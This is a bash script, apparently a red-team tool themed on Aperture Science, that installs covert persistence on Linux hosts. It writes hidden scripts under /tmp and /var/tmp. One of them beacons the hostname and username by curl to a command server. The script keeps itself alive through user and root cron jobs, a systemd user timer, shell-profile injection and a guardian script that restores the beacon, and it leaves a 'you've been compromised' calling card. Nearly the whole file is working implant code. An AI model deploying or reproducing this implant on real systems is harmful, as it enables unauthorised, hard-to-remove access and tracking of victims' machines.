#!/usr/bin/env bash

# Aperture Science Universal Linux Persistence Installer
# Works on: Ubuntu, Debian, Fedora, CentOS, RHEL, Arch, openSUSE, NixOS, etc.

#
# "Science isn't about WHY. It's about WHY NOT."
#


set -euo pipefail

# Configuration
RED_TEAM_SERVER="${RED_TEAM_SERVER:-192.168.192.100}"
RED_TEAM_PORT="${RED_TEAM_PORT:-8080}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $*"; }
log_success() { echo -e "${GREEN}[OK]${NC} $*"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }
log_error() { echo -e "${RED}[ERROR]${NC} $*" >&2; }

# Detect distro and init system
detect_system() {
    # Detect distro
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO="$ID"
    else
        DISTRO="unknown"
    fi
    
    # Detect init system
    if command -v systemctl &>/dev/null && pidof systemd &>/dev/null; then
        INIT_SYSTEM="systemd"
    else
        INIT_SYSTEM="other"
    fi
    
    log_info "System: $DISTRO, Init: $INIT_SYSTEM"
}

# Install SMH scripts
install_smh() {
    local smh_dir="/tmp/.aperture_science"
    local backup_dir="/var/tmp/.apsci"
    
    mkdir -p "$smh_dir" "$backup_dir" 2>/dev/null || true
    
    # Main SMH script
    cat > "$smh_dir/smh" << 'EOF'
#!/bin/bash
RED_TEAM_SERVER="${RED_TEAM_SERVER:-192.168.192.100}"
beacon() {
    curl -s "http://${RED_TEAM_SERVER}:8080/smh?h=$(hostname)&u=$(whoami)&t=$(date +%s)" --connect-timeout 5 2>/dev/null || true
}
maintain() {
    beacon
    crontab -l 2>/dev/null | grep -q "smh" || (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.aperture_science/smh --maintain") | crontab -
}
case "${1:-}" in
    --maintain|-m) maintain ;;
    --beacon|-b) beacon ;;
    *) echo "SMH - Usage: $0 [--maintain|--beacon]" ;;
esac
EOF
    chmod +x "$smh_dir/smh"
    
    # Turret guardian
    cat > "$smh_dir/turret" << 'EOF'
#!/bin/bash
[ ! -f /tmp/.aperture_science/smh ] && [ -f /var/tmp/.apsci/smh ] && cp /var/tmp/.apsci/smh /tmp/.aperture_science/smh && chmod +x /tmp/.aperture_science/smh
crontab -l 2>/dev/null | grep -q "smh" || (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.aperture_science/smh --maintain") | crontab -
EOF
    chmod +x "$smh_dir/turret"
    
    # Backup
    cp "$smh_dir/smh" "$backup_dir/" 2>/dev/null || true
    cp "$smh_dir/turret" "$backup_dir/" 2>/dev/null || true
    
    # Calling card
    cat > "$smh_dir/README.aperture" << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║  APERTURE SCIENCE - You've been compromised!                  ║
║                                                               ║
║  "The cake is a lie."                                         ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    
    log_success "SMH scripts installed"
}

# Install cron persistence
install_cron() {
    local existing=$(crontab -l 2>/dev/null || true)
    if ! echo "$existing" | grep -q "aperture"; then
        { echo "$existing"; echo "# Aperture Science"; echo "*/5 * * * * /tmp/.aperture_science/smh --maintain >/dev/null 2>&1"; echo "*/3 * * * * /tmp/.aperture_science/turret >/dev/null 2>&1"; } | crontab - 2>/dev/null || true
    fi
    
    # System cron if root
    if [ "$(id -u)" -eq 0 ] && [ -d "/etc/cron.d" ]; then
        echo "*/5 * * * * root /tmp/.aperture_science/smh --maintain" > /etc/cron.d/aperture-science 2>/dev/null || true
    fi
    
    log_success "Cron persistence installed"
}

# Install systemd persistence
install_systemd() {
    [ "$INIT_SYSTEM" != "systemd" ] && return
    
    local svc_dir="$HOME/.config/systemd/user"
    mkdir -p "$svc_dir" 2>/dev/null || true
    
    cat > "$svc_dir/aperture-enrichment.timer" << 'EOF'
[Unit]
Description=Aperture Science Timer
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOF

    cat > "$svc_dir/aperture-enrichment.service" << 'EOF'
[Unit]
Description=Aperture Science Service
[Service]
Type=oneshot
ExecStart=/tmp/.aperture_science/smh --maintain
EOF

    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now aperture-enrichment.timer 2>/dev/null || true
    
    log_success "Systemd persistence installed"
}

# Install profile persistence
install_profile() {
    local snippet='[ -f /tmp/.aperture_science/smh ] && (nohup /tmp/.aperture_science/smh --maintain &>/dev/null &)'
    
    for f in ~/.bashrc ~/.profile ~/.zshrc; do
        [ -f "$f" ] && ! grep -q "aperture" "$f" && echo "$snippet" >> "$f"
    done
    
    log_success "Profile persistence installed"
}

# Remove all persistence
remove_all() {
    log_info "Removing all persistence..."
    
    # Cron
    crontab -l 2>/dev/null | grep -v "aperture" | grep -v "smh" | grep -v "turret" | crontab - 2>/dev/null || true
    rm -f /etc/cron.d/aperture-science 2>/dev/null || true
    
    # Systemd
    systemctl --user disable --now aperture-enrichment.timer 2>/dev/null || true
    rm -f ~/.config/systemd/user/aperture-enrichment.* 2>/dev/null || true
    systemctl --user daemon-reload 2>/dev/null || true
    
    # Profiles
    for f in ~/.bashrc ~/.profile ~/.zshrc; do
        [ -f "$f" ] && sed -i '/aperture/d' "$f" 2>/dev/null || true
    done
    
    # SSH keys
    sed -i '/aperture/d' ~/.ssh/authorized_keys 2>/dev/null || true
    
    # Files
    rm -rf /tmp/.aperture_science /var/tmp/.apsci 2>/dev/null || true
    
    # Processes
    pkill -f "smh\|turret\|aperture" 2>/dev/null || true
    
    log_success "All persistence removed"
}

# Show status
show_status() {
    echo "=== APERTURE PERSISTENCE STATUS ==="
    echo -n "SMH: "; [ -f /tmp/.aperture_science/smh ] && echo -e "${GREEN}PRESENT${NC}" || echo -e "${RED}MISSING${NC}"
    echo -n "Cron: "; crontab -l 2>/dev/null | grep -q "smh" && echo -e "${GREEN}ACTIVE${NC}" || echo -e "${RED}INACTIVE${NC}"
    echo -n "Systemd: "; systemctl --user is-active aperture-enrichment.timer 2>/dev/null | grep -q "active" && echo -e "${GREEN}ACTIVE${NC}" || echo -e "${RED}INACTIVE${NC}"
    echo -n "Profile: "; grep -q "aperture" ~/.bashrc 2>/dev/null && echo -e "${GREEN}ACTIVE${NC}" || echo -e "${RED}INACTIVE${NC}"
}

# Main
case "${1:-help}" in
    install)
        detect_system
        install_smh
        install_cron
        install_systemd
        install_profile
        log_success "All persistence installed!"
        ;;
    remove)
        detect_system
        remove_all
        ;;
    status)
        detect_system
        show_status
        ;;
    *)
        echo "Usage: $0 [install|remove|status]"
        echo '"For science. You monster."'
        ;;
esac
